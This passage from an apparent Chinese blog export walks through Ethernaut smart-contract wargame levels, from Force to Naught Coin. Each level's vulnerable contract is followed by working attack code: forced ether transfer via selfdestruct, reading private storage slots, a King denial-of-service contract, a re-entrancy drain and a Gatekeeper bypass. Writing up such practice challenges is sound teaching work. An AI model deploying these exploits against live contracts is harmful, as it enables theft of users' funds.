plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">await contract.sendTransaction({data: '0xdd365b8b'})</span><br></pre></td></tr></table></figure>\n<p>正常调用合约函数的时候，本质上也是发送事务，只不过自动设置了data。</p>\n<p>例如，合约的 transfer(address,uint256) 函数：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">0xa9059cbb  // 4 字节 Method ID（函数签名：transfer(address,uint256)）</span><br><span class=\"line\">0x000000000000000000000000abc1234567890def1234567890abcdef12345678  // 地址参数：recipient</span><br><span class=\"line\">0x000000000000000000000000000000000000000000000000000000000000001e  // uint256 参数：amount</span><br></pre></td></tr></table></figure>\n<p>调用transfer时，msg.data就是：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">0xa9059cbb000000000000000000000000abc1234567890def1234567890abcdef1234567800000000000000000000000000000000000000000000000000000000000001e</span><br></pre></td></tr></table></figure>\n<p>我们设置了msg.data，合约检测不到同名的函数，就执行fallback。</p>\n<p><img src=\"/ethernaut/07-Delegation/image-20241222143546192.png\" alt=\"image-20241222143546192\" style=\"zoom:50%;\"></p>\n","categories":["Ethernaut"],"tags":["以太坊","智能合约","Ethernaut"]},{"title":"Ethernaut - Force","url":"/ethernaut/08-Force/","content":"<p>第一个三星题。</p>\n<p>这个合约啥也没有，目标是让合约的balance超过0。</p>\n<span id=\"more\"></span>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: MIT</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">contract Force { /*</span><br><span class=\"line\">                   MEOW ?</span><br><span class=\"line\">         /\\_/\\   /</span><br><span class=\"line\">    ____/ o o \\</span><br><span class=\"line\">    /~____  =ø= /</span><br><span class=\"line\">    (______)__m_m)</span><br><span class=\"line\">                   */ }</span><br></pre></td></tr></table></figure>\n<p>这个题需要有额外知识：</p>\n<p>selfdestruct 是 Solidity\n中的一个操作符，用于销毁合约并将其剩余的以太币转移到指定地址。调用该操作后，合约的代码和状态被从区块链中删除，合约余额会发送到指定的地址，释放存储空间。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">selfdestruct(address payable recipient);</span><br></pre></td></tr></table></figure>\n<p>所以写一个智能合约：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">contract AttackForce {</span><br><span class=\"line\">    function attack(address payable target) public payable {</span><br><span class=\"line\">        selfdestruct(target);</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">    receive() external payable {}</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<p>先给他转钱，然后销毁他把钱强行扔给Force合约。</p>\n<p><img src=\"/ethernaut/08-Force/image-20241222151712979.png\" alt=\"image-20241222151712979\" style=\"zoom:50%;\"></p>\n","categories":["Ethernaut"],"tags":["以太坊","智能合约","Ethernaut"]},{"title":"Ethernaut - Vault","url":"/ethernaut/09-Vault/","content":"<p>解锁这个保险箱！</p>\n<span id=\"more\"></span>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: MIT</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">contract Vault {</span><br><span class=\"line\">    bool public locked;</span><br><span class=\"line\">    bytes32 private password; // 隐藏的密码</span><br><span class=\"line\"></span><br><span class=\"line\">    constructor(bytes32 _password) {</span><br><span class=\"line\">        locked = true;</span><br><span class=\"line\">        password = _password;</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">    function unlock(bytes32 _password) public { // 知道密码就可以破解了</span><br><span class=\"line\">        if (password == _password) {</span><br><span class=\"line\">            locked = false;</span><br><span class=\"line\">        }</span><br><span class=\"line\">    }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<p>隐藏的密码，private变量，知道密码就可以破解了。呃这怎么办。</p>\n<p>创建这个智能合约肯定是个明文的事务，我得想办法获取这个明文事务的参数……</p>\n<p>跑偏了，这就直接看创建题目的智能合约了，不太好不太好。</p>\n<p>这题考私有变量获取。</p>\n<h1 id=\"solidity合约内存空间\">Solidity合约内存空间</h1>\n<h2 id=\"storage\">1 Storage</h2>\n<ul>\n<li>storage 是合约的永久存储空间，数据会持久存储在区块链上。</li>\n<li>每个状态变量分配到一个 <strong>存储槽（storage slot）</strong>\n中，每个存储槽为 <strong>256 位（32 字节）</strong>。</li>\n<li><strong>变量布局</strong>: Solidity\n按照变量声明的顺序将状态变量分配到存储槽中。</li>\n<li>动态类型：\n<ul>\n<li>动态数组 <code>uint256[]</code>，slot 0里存数组长度，keccak256(0) +\ni 对应第i个元素的位置</li>\n<li>结构体，按字节顺序塞满存储槽，一个不够就连续</li>\n<li>Map：键 k 的值存储在 keccak256(abi.encode(k, slot)) 的位置。</li>\n</ul></li>\n</ul>\n<h2 id=\"memory\">2 Memory</h2>\n<ul>\n<li>memory\n是用于临时存储数据的内存空间，在合约调用期间存在，调用结束后会被销毁。</li>\n<li>memory 中的访问速度比 storage 快得多。</li>\n<li><strong>动态分配</strong>:\n当存储动态数组（如字符串、字节数组）时，memory\n的大小在运行时动态分配。</li>\n</ul>\n<h2 id=\"calldata\">3 calldata</h2>\n<p>就是 msg.data 里的内容。</p>\n<h1 id=\"解题\">解题</h1>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> res = <span class=\"keyword\">await</span> provider.<span class=\"title function_\">getStorage</span>(<span class=\"variable constant_\">CONTRACT_ADDRESS</span>, <span class=\"number\">1</span>);</span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(res);</span><br><span class=\"line\"><span class=\"comment\">// byte32转string</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> str = ethers.<span class=\"title function_\">toUtf8String</span>(res);</span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(str);</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">0x412076657279207374726f6e67207365637265742070617373776f7264203a29</span><br><span class=\"line\">A very strong secret password :)</span><br></pre></td></tr></table></figure>\n<p><img src=\"/ethernaut/09-Vault/image-20241222155800089.png\" alt=\"image-20241222155800089\" style=\"zoom:50%;\"></p>\n","categories":["Ethernaut"],"tags":["以太坊","智能合约","Ethernaut"]},{"title":"Ethernaut - King","url":"/ethernaut/10-King/","content":"<p>这个游戏的Key！</p>\n<p>题目：一个简单的游戏，谁发送更多的ether谁就变成新的king！在这样的活动中，被推翻的国王会得到新的奖励，在这个过程中赚一点以太币！就像庞氏骗局一样\nxD。</p>\n<span id=\"more\"></span>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: MIT</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">contract King {</span><br><span class=\"line\">    address king;</span><br><span class=\"line\">    uint256 public prize;</span><br><span class=\"line\">    address public owner;</span><br><span class=\"line\"></span><br><span class=\"line\">\t// 初始owner和king，以及初始的prize</span><br><span class=\"line\">    constructor() payable {</span><br><span class=\"line\">        owner = msg.sender;</span><br><span class=\"line\">        king = msg.sender;</span><br><span class=\"line\">        prize = msg.value;</span><br><span class=\"line\">    }</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t// 可以收钱</span><br><span class=\"line\">    receive() external payable {</span><br><span class=\"line\">        require(msg.value &gt;= prize || msg.sender == owner); // 如果发的钱更多，成为新的king！</span><br><span class=\"line\">        </span><br><span class=\"line\">        payable(king).transfer(msg.value); // king收到转过来的钱</span><br><span class=\"line\">        king = msg.sender; // 更新king和prize</span><br><span class=\"line\">        prize = msg.value;</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">    function _king() public view returns (address) {</span><br><span class=\"line\">        return king;</span><br><span class=\"line\">    }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<p>当我提交评测的时候，他会回收king，也就是转入更多的钱把自己变回king？</p>\n<p>我要做的并不是变成king，而是让他无法回收king。</p>\n<p>！我想到个方法，如果能让我称王后，所有后续receive都无法执行都会revert就行。但是好像做不到）</p>\n<p>查到了！</p>\n<blockquote>\n<p>transfer 有一个内置的安全机制，它将转账金额限制为 2300\ngas。这个限制确保了接收方合约在执行转账时不会进行复杂的操作，防止某些合约被恶意攻击，或者耗尽大量\ngas 导致重入攻击漏洞。</p>\n</blockquote>\n<p>噢噢，就是transfer的接收方收到钱后，执行 receive\n函数，不能消耗超过2300的gas。</p>\n<p>所以我写一个复杂的合约，让他称王！别人都改不了了！</p>\n<h1 id=\"transfer的安全机制\">Transfer的安全机制</h1>\n<p>transfer 有一个内置的安全机制，它将转账金额限制为 2300\ngas。这个限制确保了接收方合约在执行转账时不会进行复杂的操作，防止某些合约被恶意攻击，或者耗尽大量\ngas 导致重入攻击漏洞。</p>\n<h1 id=\"解题\">解题</h1>\n<p>我写了个函数：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: MIT</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">contract AttackKing {</span><br><span class=\"line\">    bool public flag;</span><br><span class=\"line\"></span><br><span class=\"line\">    address payable public owner;</span><br><span class=\"line\"></span><br><span class=\"line\">    constructor() {</span><br><span class=\"line\">        flag = false;</span><br><span class=\"line\">        owner = payable(msg.sender);</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">    function withdraw() external payable {</span><br><span class=\"line\">        owner.transfer(getBalance());</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">    receive() external payable {</span><br><span class=\"line\">        if (flag) {</span><br><span class=\"line\">            // 写一个会消耗大量gas的函数</span><br><span class=\"line\">            uint256 sum = 0;</span><br><span class=\"line\">            for (uint i = 0; i &lt; 100000000; i++) {</span><br><span class=\"line\">                sum = sum + uint(i);</span><br><span class=\"line\">            }</span><br><span class=\"line\">        }</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">    function setFlat(bool _flag) public {</span><br><span class=\"line\">        flag = _flag;</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">    function beKing(address payable target) external payable {</span><br><span class=\"line\">        target.transfer(getBalance());</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">    function getBalance() public view returns (uint256) {</span><br><span class=\"line\">        return address(this).balance;</span><br><span class=\"line\">    }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<p>但是这个 beKing\n有问题！2300gas其实是个非常小的数字，King合约的receive也超过了这个限制！所以不能使用Transfer，但是可以用\ncall 来代替 Transfer。</p>\n<p>所以改成：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">function beKing(address payable target) external payable {</span><br><span class=\"line\">    (bool success, ) = target.call{value: address(this).balance}(\"\");  // 使用 call 替代 transfer</span><br><span class=\"line\">    require(success, \"Transfer failed\");</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<h1 id=\"总结\">总结</h1>\n<p>Transfer转账有很强的gas限制，通常只用来给一个普通账户转账。</p>\n<p>可以用 call 进行超过限制的转账！</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">(bool success, ) = target.call{value: address(this).balance}(\"\");  // 使用 call 替代 transfer</span><br><span class=\"line\">require(success, \"Transfer failed\");</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>Most of Ethernaut's levels try to expose (in an oversimplified form\nof course) something that actually happened — a real hack or a real\nbug.</p>\n<p>In this case, see: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cua2luZ29mdGhlZXRoZXIuY29tL3Rocm9uZXMva2luZ29mdGhlZXRoZXIvaW5kZXguaHRtbA==\">King\nof the Ether<i class=\"fa fa-external-link-alt\"></i></span> and <span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5raW5nb2Z0aGVldGhlci5jb20vcG9zdG1vcnRlbS5odG1s\">King of the Ether\nPostmortem<i class=\"fa fa-external-link-alt\"></i></span>.</p>\n</blockquote>\n","categories":["Ethernaut"],"tags":["以太坊","智能合约","Ethernaut"]},{"title":"Ethernaut - Re-entrancy","url":"/ethernaut/11-Re-entrancy/","content":"<p>这次看标题应该就是重入攻击了。</p>\n<p>目标是偷走合约的所有钱。</p>\n<p>提示是：</p>\n<ul>\n<li>不可信合约可以在你最不期望的地方执行代码；</li>\n<li>异常冒泡。</li>\n</ul>\n<span id=\"more\"></span>\n<p>先自己猜一猜怎么做。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: MIT</span><br><span class=\"line\">pragma solidity ^0.6.12; // 0.6说明是一个以前合约的通病，现在已经被解决了</span><br><span class=\"line\"></span><br><span class=\"line\">import \"openzeppelin-contracts-06/math/SafeMath.sol\";</span><br><span class=\"line\"></span><br><span class=\"line\">contract Reentrance {</span><br><span class=\"line\">    using SafeMath for uint256; // SafeMath，不会溢出。</span><br><span class=\"line\"></span><br><span class=\"line\">    mapping(address =&gt; uint256) public balances; // 每个账户有钱</span><br><span class=\"line\"></span><br><span class=\"line\">\t// donate可以给别的地址转账</span><br><span class=\"line\">    function donate(address _to) public payable {</span><br><span class=\"line\">        balances[_to] = balances[_to].add(msg.value);</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">\t// 查某个地址的钱</span><br><span class=\"line\">    function balanceOf(address _who) public view returns (uint256 balance) {</span><br><span class=\"line\">        return balances[_who];</span><br><span class=\"line\">    }</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t// 退款</span><br><span class=\"line\">    function withdraw(uint256 _amount) public {</span><br><span class=\"line\">        if (balances[msg.sender] &gt;= _amount) { // 如果发请求人账户里有足够的钱</span><br><span class=\"line\">            (bool result,) = msg.sender.call{value: _amount}(\"\"); // 就把钱发回去</span><br><span class=\"line\">            </span><br><span class=\"line\">            // 这里有点奇怪？</span><br><span class=\"line\">            // 不管成不成功，都会扣钱</span><br><span class=\"line\">            if (result) {</span><br><span class=\"line\">                _amount;</span><br><span class=\"line\">            }</span><br><span class=\"line\">            balances[msg.sender] -= _amount; // 还是会下溢！！！因为没有显示调用SafeMath</span><br><span class=\"line\">        }</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">    receive() external payable {}</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<p>之前我们知道，事务是原子性的，每一个事务要么全部发生，要么全部不发生。</p>\n<p>但是，这里退款是用的是call，call是不是会让合约变成异步的？</p>\n<p>不对，因为如果是异步的，bool result 就没有意义。</p>\n<h1 id=\"call\">call</h1>\n<p>以下是一大段废话：</p>\n<blockquote>\n<p>首先，一定是<strong>同步执行</strong>。</p>\n<p>call执行过程中，可能出现失败。比如目标合约代码抛出异常或revert，这时候会返回false，但不会触发revert。</p>\n<p>这里的执行call就很危险，因为他执行的代码是其他合约的代码，是不可信的代码。</p>\n<p>执行的过程，报错了，则会让返回值变成false。然鹅，即使返回false，也还是会扣掉账户里的钱，而我也不会收到钱。</p>\n<p>我没收到钱，我账户里的钱变少了.</p>\n<p>我希望的是，我收到了钱，但是balance里没减少。所以应该call其实执行成功了，但是调用他的合约却被迫发生了revert。</p>\n<p>执行call有没有可能直接失败，不返回结果，就回退？x</p>\n<p>有没有可能call调用的函数没有回滚，也返回false？</p>\n<p>https://professional-solidity.readthedocs.io/zh-cn/latest/source/06.error.html</p>\n<p>如果异常在子调用发生，那么异常会自动冒泡到顶层（例如：异常会重新抛出），除非他们在\n<code>try/catch</code> 语句中捕获了错误。 但是如果是在 <code>send</code>\n和 低级 <code>call</code>, <code>delegatecall</code> 和\n<code>staticcall</code> 的调用里发生异常时， 他们会返回\n<code>false</code> （第一个返回值） 而不是冒泡异常。</p>\n<p>警告注意：根据 EVM 的设计，如果被调用的地址不存在，低级别函数\n<code>call</code>, <code>delegatecall</code> 和 <code>staticcall</code>\n第一个返回值同样是 <code>true</code>。\n如果需要，请在调用之前检查账号的存在性。</p>\n<p>函数 assert 和 require 可用于检查条件并在条件不满足时抛出异常。</p>\n</blockquote>\n<h1 id=\"题解\">题解</h1>\n<p>因为每次withdraw，Reentrance执行转账，无论成功与否，都会在balance里扣除钱。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: MIT</span><br><span class=\"line\">pragma solidity ^0.6.12;</span><br><span class=\"line\"></span><br><span class=\"line\">interface Reentrance {</span><br><span class=\"line\">    function donate(address _to) external payable;</span><br><span class=\"line\">    function withdraw(uint256 _amount) external;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\">contract Attack {</span><br><span class=\"line\">    Reentrance public target;</span><br><span class=\"line\"></span><br><span class=\"line\">    constructor(address _target) public {</span><br><span class=\"line\">        target = Reentrance(_target);</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">    // Fallback function, will be called when the contract receives ether</span><br><span class=\"line\">    receive() external payable {</span><br><span class=\"line\">        uint256 balance = address(target).balance;</span><br><span class=\"line\">        if (balance &gt; 0) {</span><br><span class=\"line\">            target.withdraw(balance);  // 重入调用</span><br><span class=\"line\">        }</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">    // 发起攻击的函数</span><br><span class=\"line\">    function attack() external payable {</span><br><span class=\"line\">        require(msg.value &gt; 0, \"Send some ether to attack\");</span><br><span class=\"line\">        target.donate{value: msg.value}(address(this));  // 向目标合约捐款</span><br><span class=\"line\">        target.withdraw(msg.value);  // 开始提款</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">    // 用于撤回攻击所得的以太币</span><br><span class=\"line\">    function withdraw() external {</span><br><span class=\"line\">        msg.sender.transfer(address(this).balance);</span><br><span class=\"line\">    }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<p>卡了很久……但是我好像想复杂了。</p>\n<p>重入攻击通过receive再次调用withdraw很早就想到了，我明白中间有一个时刻，合约拿到了所有的钱，但是我以为最终会被：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">balances[msg.sender] -= _amount; </span><br></pre></td></tr></table></figure>\n<p>报错发生回退，最终导致所有调用都不成功。</p>\n<p>但是！！！！！SafeMath必须要显示调用 .add\n.sub，才是用了SafeMath！！！</p>\n<p>这里其实还发生了下溢！！！！！！！</p>\n<p>看了一下确实！！！！</p>\n<figure>\n<img src=\"/ethernaut/11-Re-entrancy/image-20241223004815790.png\" alt=\"image-20241223004815790\">\n<figcaption aria-hidden=\"true\">image-20241223004815790</figcaption>\n</figure>\n<figure>\n<img src=\"/ethernaut/11-Re-entrancy/image-20241222230240638.png\" alt=\"image-20241222230240638\">\n<figcaption aria-hidden=\"true\">image-20241222230240638</figcaption>\n</figure>\n","categories":["Ethernaut"],"tags":["以太坊","智能合约","Ethernaut"]},{"title":"Ethernaut - Elevator","url":"/ethernaut/12-Elevator/","content":"<p>电梯不会让你达到最顶层。</p>\n<ul>\n<li>Sometimes solidity is not good at keeping promises.</li>\n</ul>\n<p>很神秘的一句话。</p>\n<span id=\"more\"></span>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: MIT</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">interface Building {</span><br><span class=\"line\">    function isLastFloor(uint256) external returns (bool);</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\">contract Elevator {</span><br><span class=\"line\">    bool public top;</span><br><span class=\"line\">    uint256 public floor;</span><br><span class=\"line\"></span><br><span class=\"line\">    function goTo(uint256 _floor) public {</span><br><span class=\"line\">        Building building = Building(msg.sender);</span><br><span class=\"line\"></span><br><span class=\"line\">        if (!building.isLastFloor(_floor)) {</span><br><span class=\"line\">            floor = _floor;</span><br><span class=\"line\">            top = building.isLastFloor(floor);</span><br><span class=\"line\">        }</span><br><span class=\"line\">    }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<p>我自己得写一个合约，作为Building，提供一个isLastFloor函数。那我让他第一次调用返回false，第二次被调用返回true即可。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: MIT</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">interface IElevator {</span><br><span class=\"line\">    function goTo(uint256 _floor) external;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\">contract Building {</span><br><span class=\"line\">    bool isFirst;</span><br><span class=\"line\"></span><br><span class=\"line\">    constructor() {</span><br><span class=\"line\">        isFirst = true;</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">    function isLastFloor(uint256 _floor) external returns (bool) {</span><br><span class=\"line\">        if (isFirst) {</span><br><span class=\"line\">            isFirst = false;</span><br><span class=\"line\">            return false;</span><br><span class=\"line\">        } else {</span><br><span class=\"line\">            return true;</span><br><span class=\"line\">        }</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">    function goTo(uint256 _floor) public {</span><br><span class=\"line\">        IElevator elevator = IElevator(0x295591a34Cfac609f4A6A7B5D8D5BdcAC8987dBF);</span><br><span class=\"line\"></span><br><span class=\"line\">        elevator.goTo(_floor);</span><br><span class=\"line\">    } </span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<p>这关的启示是view和pure函数，他们不会修改合约的状态。</p>\n<p>view只会读取状态，pure既不读取也不修改。</p>\n","categories":["Ethernaut"],"tags":["以太坊","智能合约","Ethernaut"]},{"title":"Ethernaut - Privacy","url":"/ethernaut/13-Privacy/","content":"<p>解锁这个智能合约。</p>\n<p>重点应该是之前看过的内存空间结构。</p>\n<span id=\"more\"></span>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: MIT</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">contract Privacy {</span><br><span class=\"line\">    bool public locked = true; \t\t\t\t// slot0</span><br><span class=\"line\">    uint256 public ID = block.timestamp;\t// slot1</span><br><span class=\"line\">    uint8 private flattening = 10; \t\t\t// slot2</span><br><span class=\"line\">    uint8 private denomination = 255;\t\t// slot2</span><br><span class=\"line\">    uint16 private awkwardness = uint16(block.timestamp); // slot2</span><br><span class=\"line\">    bytes32[3] private data;  // slot3-5</span><br><span class=\"line\"></span><br><span class=\"line\">    constructor(bytes32[3] memory _data) {</span><br><span class=\"line\">        data = _data;</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">    function unlock(bytes16 _key) public {</span><br><span class=\"line\">        require(_key == bytes16(data[2]));</span><br><span class=\"line\">        locked = false;</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">    /*</span><br><span class=\"line\">    A bunch of super advanced solidity algorithms...</span><br><span class=\"line\"></span><br><span class=\"line\">      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`</span><br><span class=\"line\">      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,</span><br><span class=\"line\">      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\\</span><br><span class=\"line\">      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)</span><br><span class=\"line\">      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU</span><br><span class=\"line\">    */</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<p>重点是，一个状态不会存到两个slot里，一个slot剩余区域如果能存下后一个状态，会把两个状态打包在一个slot里。</p>\n<p>和Vault很像。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">async</span> <span class=\"keyword\">function</span> <span class=\"title function_\">main</span>(<span class=\"params\"></span>) {</span><br><span class=\"line\">  <span class=\"keyword\">const</span> { provider, wallet, contract } = <span class=\"title function_\">getConfig</span>(<span class=\"variable constant_\">CONTRACT_ADDRESS</span>);</span><br><span class=\"line\">  <span class=\"keyword\">let</span> res = <span class=\"keyword\">await</span> provider.<span class=\"title function_\">getStorage</span>(<span class=\"variable constant_\">CONTRACT_ADDRESS</span>, <span class=\"number\">5</span>);</span><br><span class=\"line\">  <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(res.<span class=\"title function_\">slice</span>(<span class=\"number\">0</span>, <span class=\"number\">2</span> + <span class=\"number\">32</span>));</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n","categories":["Ethernaut"],"tags":["以太坊","智能合约","Ethernaut"]},{"title":"Ethernaut - Gatekeeper One","url":"/ethernaut/14-Gatekeeper-One/","content":"<p>通过守门人，注册为参赛者，才能通过这一关。</p>\n<p>复习 Telephone 和 Token。</p>\n<p>也就是tx和msg的属性，以及数据下溢。</p>\n<p>额外还有一个 <code>gasleft()</code>函数，可以返回剩余gas数量。</p>\n<span id=\"more\"></span>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: MIT</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">contract GatekeeperOne {</span><br><span class=\"line\">    address public entrant;</span><br><span class=\"line\"></span><br><span class=\"line\">    modifier gateOne() {</span><br><span class=\"line\">        require(msg.sender != tx.origin);</span><br><span class=\"line\">        _;</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">    modifier gateTwo() {</span><br><span class=\"line\">        require(gasleft() % 8191 == 0);</span><br><span class=\"line\">        _;</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">    modifier gateThree(bytes8 _gateKey) {</span><br><span class=\"line\">        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), </span><br><span class=\"line\">        \t\t\t\"GatekeeperOne: invalid gateThree part one\");</span><br><span class=\"line\">        require(uint32(uint64(_gateKey)) != uint64(_gateKey), </span><br><span class=\"line\">        \t\t\t\"GatekeeperOne: invalid gateThree part two\");</span><br><span class=\"line\">        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), </span><br><span class=\"line\">        \t\t\t\"GatekeeperOne: invalid gateThree part three\");</span><br><span class=\"line\">        _;</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {</span><br><span class=\"line\">        entrant = tx.origin;</span><br><span class=\"line\">        return true;</span><br><span class=\"line\">    }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<p>gateOne：转发请求即可；</p>\n<p>gateTwo：要设置gasleft。可以设置调用合约的初始gas为8191。</p>\n<p>gateThree：</p>\n<ul>\n<li><p>条件1：</p>\n<p>这条条件要求 gateKey 转换成 uint64 后的低 32 位和低 16\n位相等。也就是说 gateKey 的高 16~31 位必须是 0。</p></li>\n<li><p>条件2：</p>\n<p>gateKey 的高 32 位必须是非零的。</p></li>\n<li><p>条件3：</p>\n<p>tx.origin的低16位就是_gateKey的低16位。</p></li>\n</ul>\n<p>所以我的就是：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">0x0000000100007F7B</span><br></pre></td></tr></table></figure>\n<p>这关重点是gas，可以在下图位置看到每个指令消耗的gas，发现执行完GAS消耗了256个gas。</p>\n<figure>\n<img src=\"/ethernaut/14-Gatekeeper-One/image-20241223170822785.png\" alt=\"image-20241223170822785\">\n<figcaption aria-hidden=\"true\">image-20241223170822785</figcaption>\n</figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">contract Attack {</span><br><span class=\"line\">    address target;</span><br><span class=\"line\"></span><br><span class=\"line\">    constructor(address _target) {</span><br><span class=\"line\">        target = _target;</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">    function hack(uint256 gas) external {    </span><br><span class=\"line\">        uint64 uintKey = uint64(uint160(address(msg.sender)));    </span><br><span class=\"line\">        bytes8 key = bytes8(uintKey) &amp; 0xFFFFFFFF0000FFFF;    </span><br><span class=\"line\">        (bool sent,) = address(target).call{gas: gas}(abi.encodeWithSignature(\"enter(bytes8)\", key));    </span><br><span class=\"line\">        require(sent, \"Transaction failed\");</span><br><span class=\"line\">    }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n","categories":["Ethernaut"],"tags":["以太坊","智能合约","Ethernaut"]},{"title":"Ethernaut - Naught Coin","url":"/ethernaut/16-Naught-Coin/","content":"<p>Naught Coin 是一个 ERC20 货币！</p>\n<p>这一节考点就是 ERC20 的概念了。</p>\n<span id=\"more\"></span>\n<h1 id=\"erc-20-代币接收问题\">ERC-20 代币接收问题</h1>\n<p>当 ERC-20 代币被发送到并非为处理 ERC-20\n代币而设计的智能合约时，这些代币可能会永久丢失。\n出现这种情况的原因是，接收合约无法识别或回应所传入的代币，而且 